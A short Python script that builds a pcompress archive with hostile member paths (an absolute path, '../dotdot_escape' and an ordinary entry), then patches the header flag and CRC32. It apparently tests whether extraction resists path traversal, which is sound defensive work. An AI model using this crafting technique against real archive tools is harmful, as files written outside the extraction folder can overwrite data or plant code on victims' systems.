#!/usr/bin/env python3
# Build a pcompress archive whose pax stream holds hostile member paths
# (<target>/abs_escape as an absolute path, ../dotdot_escape, ok/inside).
# Usage: craft_hostile_archive.py <pcompress> <out.pz> <absolute target dir>
# The stream is compressed with -c none in file mode, then the header's
# FLAG_ARCHIVE bit is set and its CRC32 recomputed.
import io, struct, subprocess, sys, tarfile, zlib, os
pc, out, target = sys.argv[1], sys.argv[2], sys.argv[3]
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w", format=tarfile.PAX_FORMAT) as t:
    for name, data in ((target + "/abs_escape", b"abs\n"),
                       ("../dotdot_escape", b"dd\n"),
                       ("ok/inside", b"fine\n")):
        ti = tarfile.TarInfo(name); ti.size = len(data); ti.mode = 0o644
        t.addfile(ti, io.BytesIO(data))
raw = out + ".tar"
open(raw, "wb").write(buf.getvalue())
if os.path.exists(raw + ".pz"): os.unlink(raw + ".pz")
subprocess.run([pc, "-c", "none", "-l1", raw], check=True, stderr=subprocess.DEVNULL)
d = bytearray(open(raw + ".pz", "rb").read())
flags = struct.unpack(">H", d[10:12])[0] | 2048          # FLAG_ARCHIVE
d[10:12] = struct.pack(">H", flags)
d[24:28] = struct.pack(">I", zlib.crc32(bytes(d[0:24])))  # header CRC32
open(out, "wb").write(d)
os.unlink(raw); os.unlink(raw + ".pz")
